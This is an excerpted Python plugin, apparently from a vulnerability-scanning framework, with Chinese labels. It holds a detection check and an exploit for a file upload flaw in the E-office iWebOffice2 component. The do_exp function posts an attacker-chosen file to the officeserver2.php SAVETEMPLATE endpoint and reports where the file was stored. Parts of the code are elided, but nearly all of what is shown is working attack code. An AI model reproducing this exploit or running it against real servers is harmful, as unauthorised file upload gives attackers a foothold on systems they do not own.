...
def vuln_info():
    info={
        'vuln_name': 'E-office iWebOffice2文件上传漏洞',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        status = requests.get(url + '/iweboffice/officeserver2.php',verify=False,timeout=10,headers=heads)
        if "DBSTEP V3.0" in status.text:
            result['Result'] =True
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='uploadfile':
            ...
            url = url + '/iweboffice/officeserver2.php?OPTION=SAVETEMPLATE&TEMPLATE='+exp_data['filename']
            status = requests.post(url,headers=heads,files=files,verify=False)
            print(exp_data)
            if "mFullPath" in status.text:
                result['Result'] = True
                result['Result_Info'] = '上传成功\n上传路径为:'+resultUploadPath +'attachment/'+exp_data['filename']
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
